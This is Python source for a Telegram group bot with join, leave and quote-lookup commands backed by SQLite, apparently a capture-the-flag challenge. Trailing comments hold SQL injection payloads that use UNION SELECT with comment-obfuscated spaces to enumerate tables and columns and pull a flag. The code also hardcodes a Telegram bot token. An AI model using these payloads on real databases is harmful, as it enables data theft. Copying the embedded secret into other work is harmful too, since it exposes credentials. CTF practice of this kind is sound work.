#!/usr/bin/env python3
from telegram import Update
from telegram.ext import CommandHandler, ContextTypes, Application, filters, ChatMemberHandler
from db import init_db, get_all_quotes, get_all_users_in_group, get_quote_by_id



# sqlite setup

conn = init_db()

# mention_bot code

HELP_MSG = """
    hello there, make sure you join the bot
for him to reach you out!

    /join - opt in
    /leave - opt out
    /help - display help message
    /quotes - display quotes
"""

JOINED_SUCCESSFULLY_MSG = """
    successfully joined!
"""

ALREADY_SUBSCRIBED_MSG = """
    you're in already!
"""

LEFT_SUCCESSFULLY_MSG = """
    successfully left!
"""

def format_quotes(quotes):
    quotes_str = ""
    for quote in quotes:
        quotes_str += f"""quote_id: {quote[0]}\nquote: {quote[1]}\n\n"""
    return quotes_str


async def join_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE):    
    if update.message.chat.type != "group" and update.message.chat.type != "supergroup":
        await update.message.reply_text("you can only subscribe in a group!")
        return
    username = update.message.from_user.username
    user_id = update.message.from_user.id
    chat_id = update.message.chat_id
    # add user with username and id and chat id
    # fetch user with id and chat id
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM allowed_users WHERE user_id = ? AND chat_id = ?', (user_id, chat_id))
    result = cursor.fetchone()

    if result:
        await update.message.reply_text(ALREADY_SUBSCRIBED_MSG)
    else:
        # Add the user to the allowed users database
        try:
            # insert user
            cursor.execute('INSERT INTO allowed_users (user_id, chat_id, username) VALUES (?, ?, ?)', (user_id, chat_id, username))
            conn.commit()
            print("user added")
            await update.message.reply_text(JOINED_SUCCESSFULLY_MSG)
        except:
            ## probably insufficent size
            await update.message.reply_text("something went wrong!")


async def leave_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.message.chat.type != "group" and update.message.chat.type != "supergroup":
        await update.message.reply_text("can only be performed in a group!")
        return
    user_id = update.message.from_user.id
    chat_id = update.message.chat_id
    
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM allowed_users WHERE user_id = ? AND chat_id = ?', (user_id, chat_id))
    result = cursor.fetchone()

    if result:
        # remove user
        cursor.execute('DELETE FROM allowed_users WHERE user_id = ? AND chat_id = ?', (user_id, chat_id))
        conn.commit()
        await update.message.reply_text(LEFT_SUCCESSFULLY_MSG)
    else:
        await update.message.reply_text("you didn't join yet!")



async def all_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.message.chat.type != "group" and update.message.chat.type != "supergroup":
        await update.message.reply_text("can only be performed in a group!")
        return
    users = get_all_users_in_group(update)
    if len(users) == 0:
        await update.message.reply_text("no users joined yet :(")
    else:
        users_str = ""
        for user in users:
            users_str += f"@{user[2]}\n"
        await update.message.reply_text(users_str)


async def quotes_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.message.chat.type != "group" and update.message.chat.type != "supergroup":
        await update.message.reply_text("can only be performed in a group!")
        return

    # check if there is a parameter id after the /quotes command
    if len(ctx.args) > 0:
        if len(ctx.args) > 1:
            await update.message.reply_text("only one argument is allowed!")
            return
        quote_id = ctx.args[0]
        try:
            quote = get_quote_by_id(quote_id)
        except Exception as e:
            print(e)
            await update.message.reply_text("server error!")
            return
        if quote:
            await update.message.reply_text(f"quote: {quote[1]}")
        else:
            await update.message.reply_text("quote not found!")
    else:
        print("no args found")
        quotes = get_all_quotes()
        if len(quotes) == 0:
            await update.message.reply_text("no quotes found!")
        else:
            await update.message.reply_text(format_quotes(quotes))


async def help_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(HELP_MSG)


async def error(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    print(f'Update {update} caused error {ctx.error}')


BOT_TOKEN = "7175410122:AAEFZFdev5WUWCevNxK6XyjoGRe7o2oetwQ"

def main():
    try:
        print("bot started!")


        app = Application.builder().token(BOT_TOKEN).build()

        #commands
        # app.add_handler(CommandHandler('start', start_command))
        app.add_handler(CommandHandler('help', help_command))
        app.add_handler(CommandHandler('join', join_command))
        app.add_handler(CommandHandler('leave', leave_command))
        app.add_handler(CommandHandler('all', all_command))
        app.add_handler(CommandHandler('quotes', quotes_handler))
        # leave group
        # app.add_handler(ChatMemberHandler(filters.ALL, leave_handler))

        #errors
        app.add_error_handler(error)

        #checking for updates
        print("polling...")
        app.run_polling(poll_interval=3)
    except:
        print("something went wrong!")
        conn.close()


if __name__ == "__main__":
    main()


# to get the table name /quotes 800/*\*/UNION/*\*/SELECT/*\*/1,/*\*/group_concat(tbl_name)/*\*/FROM/*\*/sqlite_master/*\*/WHERE/*\*/type='table'/*\*/and/*\*/tbl_name/*\*/NOT/*\*/like/*\*/'sqlite_%'
# to get the column names /quotes 800/*\*/UNION/*\*/SELECT/*\*/1,/*\*/sql/*\*/FROM/*\*/sqlite_master/*\*/WHERE/*\*/type!='meta'/*\*/AND/*\*/sql/*\*/NOT/*\*/NULL/*\*/AND/*\*/name/*\*/='HAjZVSbRXArNjULyWtIhXxeuSiQzqS'
# to get the flag /quotes 500 UNION SELECT 1, COLUMN_NAME FROM TABLE_NAME